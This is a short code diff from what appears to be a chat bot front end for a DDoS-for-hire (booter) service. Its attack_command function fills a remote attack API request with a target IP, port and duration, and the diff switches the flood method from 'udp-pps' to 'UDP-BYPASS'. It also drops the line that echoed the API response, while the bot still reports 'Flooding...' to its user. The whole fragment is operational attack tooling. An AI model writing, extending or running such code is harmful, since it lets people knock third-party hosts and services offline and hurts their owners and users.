@@ -1506,7 +1506,7 @@ def attack_command(message):
             url = url.replace("[target]", ip)\
                      .replace("[port]", str(port))\
                      .replace("[time]", str(duration))\
-                     .replace("[method]", "udp-pps")
+                     .replace("[method]", "UDP-BYPASS")
             
             if "key=0" in url:
                 url = url.replace("key=0", f"key={key}")
@@ -1518,7 +1518,7 @@ def attack_command(message):
                 "host": ip,
                 "port": port,
                 "time": duration,
-                "method": "udp-pps",
+                "method": "UDP-BYPASS",
                 "concurrent": 1
             }
             response = requests.get(url, params=params, timeout=30)
@@ -1533,7 +1533,6 @@ def attack_command(message):
                 f"🎯 Target: `{ip}:{port}`\n"
                 f"⏱️ Duration: `{duration}s`\n"
                 f"💥 Status: Flooding...\n"
-                f"📝 **API Response:** `{api_res_text}`\n"
                 f"🔔 You will be notified when finished."
                 f"{brand_suffix}",
                 parse_mode="Markdown")
